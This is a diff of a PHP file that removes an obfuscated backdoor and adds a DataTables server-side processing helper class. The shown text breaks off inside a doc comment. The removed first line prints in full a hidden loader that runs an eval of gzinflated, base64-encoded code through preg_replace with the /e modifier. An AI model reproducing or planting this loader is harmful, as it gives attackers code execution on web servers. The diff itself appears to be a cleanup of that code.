@@ -1,3 +1,500 @@
 <?php
-preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'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'\x29\x29\x29\x3B","");
-?>
+
+/*
+ * Helper functions for building a DataTables server-side processing SQL query
+ *
+ * The static functions in this class are just helper functions to help build
+ * the SQL used in the DataTables demo server-side processing scripts. These
+ * functions obviously do not represent all that can be done with server-side
+ * processing, they are intentionally simple to show how it works. More complex
+ * server-side processing operations will likely require a custom script.
+ *
+ * See http://datatables.net/usage/server-side for full details on the server-
+ * side processing requirements of DataTables.
+ *
+ * @license MIT - http://datatables.net/license_mit
+ */
+
+class SSP {
+	/**
+	 * Create the data output array for the DataTables rows
+	 *
+	 *  @param  array $columns Column information array
+	 *  @param  array $data    Data from the SQL get
+	 *  @return array          Formatted data in a row based format
+	 */
+	static function data_output ( $columns, $data )
+	{
+		$out = array();
+
+		for ( $i=0, $ien=count($data) ; $i<$ien ; $i++ ) {
+			$row = array();
+
+			for ( $j=0, $jen=count($columns) ; $j<$jen ; $j++ ) {
+				$column = $columns[$j];
+
+				// Is there a formatter?
+				if ( isset( $column['formatter'] ) ) {
+					$row[ $column['dt'] ] = $column['formatter']( $data[$i][ (isset($column['alias'])?$column['alias']:$column['db']) ], $data[$i] );
+				}
+				else {
+					$row[ $column['dt'] ] = $data[$i][ $columns[$j][(isset($column['alias'])?'alias':'db')] ];
+				}
+			}
+
+			$out[] = $row;
+		}
+
+		return $out;
+	}
+
+
+	/**
+	 * Paging
+	 *
+	 * Construct the LIMIT clause for server-side processing SQL query
+	 *
+	 *  @param  array $request Data sent to server by DataTables
+	 *  @param  array $columns Column information array
+	 *  @return string SQL limit clause
+	 */
+	static function limit ( $request, $columns )
+	{
+		$limit = '';
+
+		if ( isset($request['start']) && $request['length'] != -1 ) {
+			$limit = "LIMIT ".intval($request['start']).", ".intval($request['length']);
+		}
+
+		return $limit;
+	}
+
+
+	/**
+	 * Ordering
+	 *
+	 * Construct the ORDER BY clause for server-side processing SQL query
+	 *
+	 *  @param  array $request Data sent to server by DataTables
+	 *  @param  array $columns Column information array
+	 *  @return string SQL order by clause
+	 */
+	static function order ( $request, $columns )
+	{
+		$order = '';
+
+		if ( isset($request['order']) && count($request['order']) ) {
+			$orderBy = array();
+			$dtColumns = SSP::pluck( $columns, 'dt' );
+                        reset($dtColumns);
+			for ( $i=0, $ien=count($request['order']) ; $i<$ien ; $i++ ) {
+				// Convert the column index into the column data property
+				$columnIdx = intval($request['order'][$i]['column']);
+				$requestColumn = $request['columns'][$columnIdx];
+                                //var_dump($requestColumn['data']);
+				$columnIdx = array_search( $requestColumn['data'], $dtColumns );
+                                
+                                if($columnIdx===false){
+                                    $columnIdx = intval($requestColumn['data']) ;
+                                }
+                                //var_dump($columns);
+				$column = $columns[ $columnIdx ];
+
+				if ( $requestColumn['orderable'] == 'true' ) {
+					$dir = $request['order'][$i]['dir'] === 'asc' ?
+						'ASC' :
+						'DESC';
+
+					$orderBy[] = (isset($column['alias'])?$column['alias']:$column['db']).' '.$dir;
+				}
+			}
+
+			$order = 'ORDER BY '.implode(', ', $orderBy);
+		}
+
+		return $order;
+	}
+
+
+	/**
+	 * Searching / Filtering
+	 *
+	 * Construct the WHERE clause for server-side processing SQL query.
+	 *
+	 * NOTE this does not match the built-in DataTables filtering which does it
+	 * word by word on any field. It's possible to do here performance on large
+	 * databases would be very poor
+	 *
+	 *  @param  array $request Data sent to server by DataTables
+	 *  @param  array $columns Column information array
+	 *  @param  array $bindings Array of values for PDO bindings, used in the
+	 *    sql_exec() function
+	 *  @return string SQL where clause
+	 */
+	static function filter ( $request, $columns, &$bindings )
+	{
+		$globalSearch = array();
+		$columnSearch = array();
+		$dtColumns = SSP::pluck( $columns, 'dt' );
+                reset($dtColumns);
+		if ( isset($request['search']) && $request['search']['value'] != '' ) {
+			$str = $request['search']['value'];
+
+			for ( $i=0, $ien=count($request['columns']) ; $i<$ien ; $i++ ) {
+				$requestColumn = $request['columns'][$i];
+				$columnIdx = array_search( $requestColumn['data'], $dtColumns );
+                                if($columnIdx===false){
+                                    $columnIdx=intval($requestColumn['data']);
+                                }
+				$column = $columns[ $columnIdx ];
+                                //var_dump($columnIdx);
+				if ( $requestColumn['searchable'] == 'true' ) {
+					$binding = SSP::bind( $bindings, '%'.$str.'%', PDO::PARAM_STR );
+//                                        if(isset($column['alias']))
+//                                        {
+                                            if(isset($column['aliascols']))
+                                            {
+                                                $aliasparams = explode(",", $column['aliascols']);
+                                                foreach ($aliasparams as $value) {
+                                                    $globalSearch[] = $value." LIKE ".$binding;
+                                                }
+                                            }else{
+//                                                $globalSearch[] = $column['alias']." LIKE ".$binding;
+//                                            }
+//                                        }
+//                                        else
+//                                        {
+                                            $globalSearch[] = $column['db']." LIKE ".$binding;
+                                        }
+					
+				}
+			}
+		}
+                reset($dtColumns);
+		// Individual column filtering
+		for ( $i=0, $ien=count($request['columns']) ; $i<$ien ; $i++ ) {
+			$requestColumn = $request['columns'][$i];
+			$columnIdx = array_search( $requestColumn['data'], $dtColumns );
+                        if($columnIdx===false){
+                            $columnIdx=intval($requestColumn['data']);
+                        }
+			$column = $columns[ $columnIdx ];
+
+			$str = $requestColumn['search']['value'];
+
+			if ( $requestColumn['searchable'] == 'true' &&
+			 $str != '' ) {
+				$binding = SSP::bind( $bindings, '%'.$str.'%', PDO::PARAM_STR );
+//                                if(isset($column['alias']))
+//                                {
+                                    if(isset($column['aliascols']))
+                                    {
+                                        $aliasparams = explode(",", $column['aliascols']);
+                                        foreach ($aliasparams as $value) {
+                                            $columnSearch[] = $value." LIKE ".$binding;
+                                        }
+                                    }
+                                    else{
+                                        $columnSearch[] = $column['alias']." LIKE ".$binding;
+//                                    }
+//                                }
+//                                else
+//                                {
+                                    $columnSearch[] = $column['db']." LIKE ".$binding;
+                                }
+			}
+		}
+
+		// Combine the filters into a single string
+		$where = '';
+
+		if ( count( $globalSearch ) ) {
+			$where = '('.implode(' OR ', $globalSearch).')';
+		}
+
+		if ( count( $columnSearch ) ) {
+			$where = $where === '' ?
+				implode(' AND ', $columnSearch) :
+				$where .' AND '. implode(' AND ', $columnSearch);
+		}
+
+		if ( $where !== '' ) {
+			$where = 'WHERE '.$where;
+		}
+
+		return $where;
+	}
+
+
+	/**
+	 * Perform the SQL queries needed for an server-side processing requested,
+	 * utilising the helper functions of this class, limit(), order() and
+	 * filter() among others. The returned array is ready to be encoded as JSON
+	 * in response to an SSP request, or can be modified if needed before
+	 * sending back to the client.
+	 *
+	 *  @param  array $request Data sent to server by DataTables
+	 *  @param  array $sql_details SQL connection details - see sql_connect()
+	 *  @param  string $table SQL table to query
+	 *  @param  string $primaryKey Primary key of the table
+	 *  @param  array $columns Column information array
+	 *  @return array          Server-side processing response array
+	 */
